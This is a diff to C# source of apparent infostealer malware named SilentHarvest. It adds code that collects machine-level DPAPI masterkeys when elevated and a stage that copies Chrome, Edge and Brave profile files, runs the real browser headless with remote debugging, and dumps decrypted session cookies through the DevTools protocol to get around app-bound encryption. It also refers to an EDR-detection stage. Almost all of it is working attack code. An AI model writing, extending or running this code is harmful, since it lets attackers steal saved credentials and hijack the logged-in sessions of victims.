@@ -505,11 +505,12 @@ namespace SilentHarvest
         // ------------------------------------------------------------ DPAPI vault
         // raw material: DPAPI masterkeys + Credential Manager vault blobs +
         // FTP client configs with legacy-obfuscated passwords
-        public static string VaultStage(List<Part> parts)
+        public static string VaultStage(List<Part> parts, bool elevated)
         {
             int n = 0;
             string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
             string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string windir = Environment.GetFolderPath(Environment.SpecialFolder.System);
 
             string[][] dirs = new string[][]
             {
@@ -534,6 +535,38 @@ namespace SilentHarvest
                     }
                 }
                 catch { }
+            }
+
+            // machine-scope DPAPI masterkeys (S-1-5-18): with these + user
+            // masterkeys, every offline unwrap works — vault blobs and the
+            // SYSTEM layer of app-bound keys. Requires elevation.
+            if (elevated)
+            {
+                string[] mdirs = new string[]
+                {
+                    Path.Combine(windir, @"Microsoft\Protect"),
+                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18"),
+                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18\User"),
+                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18\Preferred"),
+                };
+                foreach (string md in mdirs)
+                {
+                    if (!Directory.Exists(md)) continue;
+                    try
+                    {
+                        foreach (string f in Directory.GetFiles(md, "*", SearchOption.AllDirectories))
+                        {
+                            byte[] data = Util.ReadFileLoose(f);
+                            if (data == null || data.Length > 1024 * 1024) continue;
+                            string rel = f.Substring(f.IndexOf("Protect")).Replace('\\', '_');
+                            if (parts.Exists(delegate(Part pp) { return pp.Name == "win:mprotect/" + rel; })) continue;
+                            parts.Add(new Part("win:mprotect/" + rel, data,
+                                new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
+                            n++;
+                        }
+                    }
+                    catch { }
+                }
             }
 
             // RDP server hints (readable registry, no elevation needed)
@@ -677,6 +710,270 @@ namespace SilentHarvest
             parts.Add(new Part("win:edr", System.Text.Encoding.UTF8.GetBytes(
                 hits.Length > 0 ? hits : "none detected\n"), null));
             return hits.Length > 0 ? ("edr=" + hits.Replace("\n", ",").TrimEnd(',')) : "edr=none";
+        }
+
+
+        // ------------------------------------------------------------ devtools
+        // ABE bypass via the browser itself (T1555.003 / T1539): spawn the
+        // genuine signed chrome.exe headless against a shadow copy of the
+        // profile; Chrome decrypts v20 app-bound cookies through its own
+        // elevation service, and we dump them via the DevTools protocol.
+        public static string DevToolsStage(List<Part> parts)
+        {
+            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            string[][] cands = new string[][]
+            {
+                new string[] { "chrome", FindBrowserExe("chrome.exe",
+                    @"Google\Chrome\Application\chrome.exe"),
+                    Path.Combine(lad, @"Google\Chrome\User Data") },
+                new string[] { "edge", FindBrowserExe("msedge.exe",
+                    @"Microsoft\Edge\Application\msedge.exe"),
+                    Path.Combine(lad, @"Microsoft\Edge\User Data") },
+                new string[] { "brave", FindBrowserExe("brave.exe",
+                    @"BraveSoftware\Brave-Browser\Application\brave.exe"),
+                    Path.Combine(lad, @"BraveSoftware\Brave-Browser\User Data") },
+            };
+            int done = 0;
+            foreach (string[] c in cands)
+            {
+                if (c[1] == null || !File.Exists(c[1]) || !Directory.Exists(c[2])) continue;
+                try
+                {
+                    byte[] cookies = DevToolsDumpCookies(c[1], c[2]);
+                    if (cookies != null && cookies.Length > 40)
+                    {
+                        parts.Add(new Part("b:" + c[0] + "/devtools_cookies.json", cookies,
+                            new Util.JsonObj().Add("method", "cdp Network.getAllCookies").ToString()));
+                        done++;
+                        Util.Log("{0}: devtools dump {1} bytes", c[0], cookies.Length);
+                    }
+                }
+                catch (Exception e) { Util.Log("{0}: devtools failed: {1}", c[0], e.Message); }
+            }
+            return "devtools=" + done;
+        }
+
+        private static string FindBrowserExe(string exe, string relPath)
+        {
+            string[] roots = new string[]
+            {
+                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
+                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            };
+            foreach (string r in roots)
+            {
+                if (string.IsNullOrEmpty(r)) continue;
+                string p = Path.Combine(Path.Combine(r, relPath.Split('\\')[0]),
+                                        string.Join("\\", relPath.Split('\\'), 1, relPath.Split('\\').Length - 1));
+                if (File.Exists(p)) return p;
+            }
+            // App Paths registry fallback
+            try
+            {
+                object v = Microsoft.Win32.Registry.LocalMachine
+                    .OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" + exe)
+                    .GetValue("");
+                if (v != null && File.Exists(v.ToString())) return v.ToString();
+            }
+            catch { }
+            return null;
+        }
+
+        private static byte[] DevToolsDumpCookies(string exe, string userData)
+        {
+            string tempRoot = Path.Combine(Path.GetTempPath(),
+                "sh_dt_" + Guid.NewGuid().ToString("N").Substring(0, 10));
+            string ud = Path.Combine(tempRoot, "ud");
+            Process proc = null;
+            try
+            {
+                // shadow profile: the files Chrome needs to decrypt the store
+                Directory.CreateDirectory(Path.Combine(ud, "Default", "Network"));
+                byte[] ls = Util.ReadFileLoose(Path.Combine(userData, "Local State"));
+                if (ls == null) return null;
+                File.WriteAllBytes(Path.Combine(ud, "Local State"), ls);
+                string[][] copies = new string[][]
+                {
+                    new string[] { Path.Combine(userData, "Default", "Network", "Cookies"),
+                                   Path.Combine(ud, "Default", "Network", "Cookies") },
+                    new string[] { Path.Combine(userData, "Default", "Network", "Login Data"),
+                                   Path.Combine(ud, "Default", "Network", "Login Data") },
+                    new string[] { Path.Combine(userData, "Default", "Login Data"),
+                                   Path.Combine(ud, "Default", "Login Data") },
+                    new string[] { Path.Combine(userData, "Default", "Web Data"),
+                                   Path.Combine(ud, "Default", "Web Data") },
+                };
+                foreach (string[] cp in copies)
+                {
+                    if (!File.Exists(cp[0])) continue;
+                    byte[] d = Util.ReadFileLoose(cp[0]);
+                    if (d == null)
+                        d = Util.ReadFileViaHandleDup(FileSuffixFromUserData(userData, cp[0]));
+                    if (d != null) File.WriteAllBytes(cp[1], d);
+                }
+
+                ProcessStartInfo psi = new ProcessStartInfo(exe,
+                    "--headless=new --remote-debugging-port=0 --user-data-dir=\"" + ud + "\" " +
+                    "--no-first-run --no-default-browser-check --disable-gpu " +
+                    "--disable-extensions --remote-allow-origins=* about:blank");
+                psi.CreateNoWindow = true;
+                psi.UseShellExecute = false;
+                psi.RedirectStandardError = true;
+                psi.RedirectStandardOutput = true;   // some builds print the banner here
+                proc = Process.Start(psi);
+
+                string wsUrl = null;
+                // line-wise readers: ReadToEnd blocks until exit, so we would
+                // never see the banner while headless chrome is running
+                string allErr = "";
+                object box = new object();
+                System.Threading.ParameterizedThreadStart reader = delegate(object sr)
+                {
+                    try
+                    {
+                        System.IO.StreamReader r = (System.IO.StreamReader)sr;
+                        string ln;
+                        while ((ln = r.ReadLine()) != null)
+                            lock (box) { allErr += ln + "\n"; }
+                    }
+                    catch { }
+                };
+                System.Threading.Thread worker = new System.Threading.Thread(reader);
+                worker.IsBackground = true;
+                worker.Start(proc.StandardError);
+                System.Threading.Thread worker2 = new System.Threading.Thread(reader);
+                worker2.IsBackground = true;
+                worker2.Start(proc.StandardOutput);
+                for (int i = 0; i < 150; i++)   // up to 15s
+                {
+                    System.Threading.Thread.Sleep(100);
+                    lock (box)
+                    {
+                        int j = allErr.IndexOf("DevTools listening on ", StringComparison.Ordinal);
+                        if (j >= 0)
+                        {
+                            int k = allErr.IndexOf(' ', j + 22);
+                            wsUrl = allErr.Substring(j + 22, (k < 0 ? allErr.Length : k) - (j + 22)).Trim();
+                            break;
+                        }
+                    }
+                }
+                if (wsUrl == null) return null;
+                Util.Log("  devtools endpoint: {0}", wsUrl);
+
+                // Storage.getCookies is browser-wide; Network.* needs a page
+                // target. The cookie store initialises asynchronously (ABE
+                // unwrap via the elevation service), so retry while empty,
+                // then fall back to a page target + Network.getAllCookies.
+                byte[] best = null;
+                for (int i = 0; i < 8; i++)
+                {
+                    byte[] r1 = CdpCall(wsUrl, "{\"id\":1,\"method\":\"Storage.getCookies\"}");
+                    if (r1 != null)
+                    {
+                        string t = System.Text.Encoding.UTF8.GetString(r1);
+                        if (t.Contains("\"cookies\":[{"))
+                        { Util.Log("  storage.getCookies ok on try {0}: {1} bytes", i + 1, r1.Length); return r1; }
+                        best = r1;
+                    }
+                    System.Threading.Thread.Sleep(500);
+                }
+                // page-target route: /json list -> first page ws -> Network.*
+                try
+                {
+                    System.Threading.Thread.Sleep(300);
+                    string pageWs = PageTargetWebSocket(wsUrl);
+                    if (pageWs != null)
+                    {
+                        Util.Log("  page target: {0}", pageWs);
+                        byte[] r2 = CdpCall(pageWs, "{\"id\":1,\"method\":\"Network.getAllCookies\"}");
+                        if (r2 != null && System.Text.Encoding.UTF8.GetString(r2).Contains("\"cookies\":[{"))
+                        { Util.Log("  network.getAllCookies ok: {0} bytes", r2.Length); return r2; }
+                    }
+                }
+                catch (Exception e) { Util.Log("  page-target failed: {0}", e.Message); }
+                if (best != null && best.Length > 20)
+                    Util.Log("  devtools: cookies empty ({0})", System.Text.Encoding.UTF8.GetString(best).Length > 120 ? "big" : "small");
+                return best;
+            }
+            finally
+            {
+                try { if (proc != null && !proc.HasExited) proc.Kill(); } catch { }
+                try { Directory.Delete(tempRoot, true); } catch { }
+            }
+        }
+
+        private static string FileSuffixFromUserData(string userData, string fullPath)
+        {
+            // e.g. Google\Chrome\User Data\Default\Network\Cookies
+            int i = fullPath.IndexOf(userData, StringComparison.OrdinalIgnoreCase);
+            string rel = i >= 0 ? fullPath.Substring(userData.Length).TrimStart('\\') : Path.GetFileName(fullPath);
+            string browser = userData.ToLowerInvariant().Contains("brave")
+                ? @"BraveSoftware\Brave-Browser\User Data"
+                : userData.ToLowerInvariant().Contains("edge")
+                    ? @"Microsoft\Edge\User Data"
+                    : @"Google\Chrome\User Data";
+            return browser + "\\" + rel;
+        }
+
+
+        private static string PageTargetWebSocket(string browserWsUrl)
+        {
+            // ws://127.0.0.1:PORT/devtools/browser/... -> http://127.0.0.1:PORT/json
+            int p1 = browserWsUrl.IndexOf("//") + 2;
+            int p2 = browserWsUrl.IndexOf('/', p1);
+            string hostPort = browserWsUrl.Substring(p1, p2 - p1);
+            string http = "http://" + hostPort + "/json";
+            System.Net.HttpWebRequest rq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(http);
+            rq.Timeout = 5000;
+            using (System.Net.HttpWebResponse rs = (System.Net.HttpWebResponse)rq.GetResponse())
+            using (System.IO.Stream st = rs.GetResponseStream())
+            using (System.IO.StreamReader rd = new System.IO.StreamReader(st))
+            {
+                string body = rd.ReadToEnd();
+                int i = body.IndexOf("page");
+                // crude: first webSocketDebuggerUrl entry of type page
+                int j = body.IndexOf("\"webSocketDebuggerUrl\": \"");
+                if (j < 0) j = body.IndexOf("\"webSocketDebuggerUrl\":\"");
+                if (j < 0) return null;
+                int q1 = body.IndexOf('"', body.IndexOf(':', j) + 2);
+                int q2 = body.IndexOf('"', q1 + 1);
+                string ws = body.Substring(q1 + 1, q2 - q1 - 1);
+                return ws.StartsWith("ws") ? ws : null;
+            }
+        }
+        private static byte[] CdpCall(string wsUrl, string message)
+        {
+            System.Net.WebSockets.ClientWebSocket ws =
+                new System.Net.WebSockets.ClientWebSocket();
+            ws.ConnectAsync(new Uri(wsUrl), System.Threading.CancellationToken.None)
+              .Wait(8000);
+            if (ws.State != System.Net.WebSockets.WebSocketState.Open) return null;
+            byte[] send = System.Text.Encoding.UTF8.GetBytes(message);
+            ws.SendAsync(new ArraySegment<byte>(send),
+                System.Net.WebSockets.WebSocketMessageType.Text, true,
+                System.Threading.CancellationToken.None).Wait(8000);
+
+            using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
+            {
+                byte[] buf = new byte[256 * 1024];
+                System.Threading.CancellationToken ct = System.Threading.CancellationToken.None;
+                while (true)
+                {
+                    System.Threading.Tasks.Task<System.Net.WebSockets.WebSocketReceiveResult> t =
+                        ws.ReceiveAsync(new ArraySegment<byte>(buf), ct);
+                    if (!t.Wait(30000)) break;
+                    var r = t.Result;
+                    if (r.MessageType == System.Net.WebSockets.WebSocketMessageType.Close) break;
+                    ms.Write(buf, 0, r.Count);
+                    if (r.EndOfMessage) break;
+                    if (ms.Length > 64 * 1024 * 1024) break;
+                }
+                try { ws.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure,
+                     "done", ct).Wait(2000); } catch { }
+                return ms.ToArray();
+            }
         }
 
         // ------------------------------------------------------------ sysinfo
